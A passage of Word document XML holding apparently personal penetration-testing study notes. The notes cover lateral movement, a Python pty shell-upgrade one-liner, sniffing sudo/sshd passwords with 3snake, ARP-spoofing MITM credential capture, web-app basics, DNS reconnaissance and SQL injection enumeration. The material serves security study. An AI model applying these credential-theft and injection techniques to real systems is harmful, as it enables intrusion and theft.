    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005E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Sudo creds, ssh lateral movement</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005E3">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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Python -c ‘import pty; pty.spawn(“/bin/sh”)’</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005E4">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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3snake TOOL → listen to proc events related to sudo or sshd, ptrace unix system call for read and write calls → passwords</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005E5">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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5E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Better cap, capture credentials http post requests, mitm </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005E7">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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Spoof gateways device as attacker machine, arp spoofing, arp cache poisoning</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005E8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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5E9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="32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29o0e48oknj" w:id="213"/>
        <w:bookmarkEnd w:id="213"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005EA">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="32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v2skoo68vcmf" w:id="214"/>
        <w:bookmarkEnd w:id="21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Web App Security</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005EB">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b8tooxe6czt" w:id="215"/>
        <w:bookmarkEnd w:id="21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Web App Basics</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005EC">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pg2rnmr55n69" w:id="216"/>
        <w:bookmarkEnd w:id="21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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005E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Request  → type of http req, protocol, host, useragent, accept, accept-encoding, conn</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005E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Response → OK, date cache-control, content-type, content-encoding, server, content-length</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005E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pb9w7t5qf7f" w:id="217"/>
        <w:bookmarkEnd w:id="21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HTTPS</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F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Encrypt with SSL/TLS </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F1">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1k496rjr2dqb" w:id="218"/>
        <w:bookmarkEnd w:id="218"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F2">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ezaac469hzz" w:id="219"/>
        <w:bookmarkEnd w:id="21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Encoding</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F3">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z4ra2tqqq9" w:id="220"/>
        <w:bookmarkEnd w:id="22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Character set</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F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Represent all symbols end user can display in browser window</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F5">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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Symbol → user reads on screen</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F6">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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Code Point → numeric index</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F7">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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ASCII, Unicode</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F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5F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Character Encoding → mapping of the symbols to a series of ordered bytes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F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HTML encoding </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F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URL ENcoding</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005FC">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77qkwhi8ir8" w:id="221"/>
        <w:bookmarkEnd w:id="22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Base64</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F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padding at the end</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005FE">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qguze1yozqb" w:id="222"/>
        <w:bookmarkEnd w:id="22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SAME Origin</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005F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Same origin policy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sop) →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Prevent a script or docco setting /getting properties from another document from a different origin</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000600">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>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Initiated when cross site http requests are initiated from client side scripts</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000601">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>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Stops an iframe getting another site on current page</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000060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0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04">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lb4s9nropy6o" w:id="223"/>
        <w:bookmarkEnd w:id="22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Exceptions to Access</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000605">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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Location property can always be written to another document → window.location redirect to new page</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000606">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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document.domain,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000060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vbm6xp8studv" w:id="224"/>
        <w:bookmarkEnd w:id="224"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000608">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jnykpqdj3mhh" w:id="225"/>
        <w:bookmarkEnd w:id="22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Cross Origin Resource Sharing </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000060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HTML 5, bypass same origin policy </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000060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i22nh2hvfsrg" w:id="226"/>
        <w:bookmarkEnd w:id="226"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000060B">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4zfnnxq2z24x" w:id="227"/>
        <w:bookmarkEnd w:id="22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COOKIEs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000060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 is stateless , cookies can maintain session </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000060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Cookies can only be set for domain, ie.will persist for subdomains</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000060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Contain</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000060F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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Domain</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000610">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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Expires, path (eg./downloads)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000611">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="99"/>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Content (key/values),  httponly flag (cookie only through http) , secure flag flag (https)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061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Depending flags set, cookie is accessible through javascript</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061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14">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hxy8swns9ei2" w:id="228"/>
        <w:bookmarkEnd w:id="22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Session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061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Web Server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store variables and data (cookies are stored on client side)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061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Uses a session ID / token for each client</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061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Ie. phpsessionid, jsessionid</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061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Can create session on events</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061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Could use lots of data, hence session cookie (small delta)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061A">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87hlejgksrs" w:id="229"/>
        <w:bookmarkEnd w:id="22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Web Application Proxies</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061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Intercepting proxies</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Burpe suite</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Zap</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061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*Different to a proxy, which serve a different purpose</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000061F">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ccf49vbaf7de" w:id="230"/>
        <w:bookmarkEnd w:id="23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Information Gathering (WebApp)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000062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2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Footprint-</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000622">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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Whois</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000623">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000624">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="216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Dns queries → produce resource queries</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000625">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="288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Domain name→ [ttl, record class]--&gt; [start of authority (SOA), Name server, A record (host to ip), PTR(pointer,ip to hostname), CNAME (alias to hostname to A record hostname) , mail exchange)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000062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27">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="76"/>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Nslookup → hostname of ip addresses</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000628">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="720" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:eastAsia="Roboto" w:hAnsi="Roboto"/>
          <w:b w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000062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Name server→ dns server that replies to all lookup queries regarding a namespace of a domain</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000062A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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Netcat /httprint etc fingerprint a web server</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000062B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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Whatweb , fingerprinting a web server</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000062C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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62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URL rewrite → mod_rewrite, module .htaccess</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000062E">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fssk8esf58o8" w:id="231"/>
        <w:bookmarkEnd w:id="231"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000062F">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ssk8esf58o8" w:id="231"/>
        <w:bookmarkEnd w:id="23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Enumerating Subdomains</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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Netcraft</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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Google operators → site: .microsoft.com</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000632">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="101"/>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-inurl:www (stopped from returning)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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Tools (subbrute,dnsrecon)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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ZONE Transfer → contents of a dns zone files are copied from a primary dns server to a secondary  .Sometimes enabled for all ip, allows to enum all the subdomains</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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36">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="480"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548e4oawgti4" w:id="232"/>
        <w:bookmarkEnd w:id="23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SQL Injections</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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String terminators → ‘   ‘’</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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Sql commands → select, union etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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Comments → #   --  -- - </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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3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3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Mssql → incorrect syntax near</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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Mysql → you have an error in your sql syntax</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000063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4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q6bwpinhjyxh" w:id="233"/>
        <w:bookmarkEnd w:id="23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Boolean based detection </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000064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queries which are true/false conditions</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000642">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>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Inject an always true and false</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000643">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>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644">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="61"/>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tl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000064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2teun4hb16lk" w:id="234"/>
        <w:bookmarkEnd w:id="234"/>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In-band sql injections</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000064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union based sql injections, extract database content</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000064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4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Enumerating columns</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000649">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>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Insert nulls incrementally to see when errors stops</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000064A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>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Field types (type enforcing unions), start with nulls, then strings and integers</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000064B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
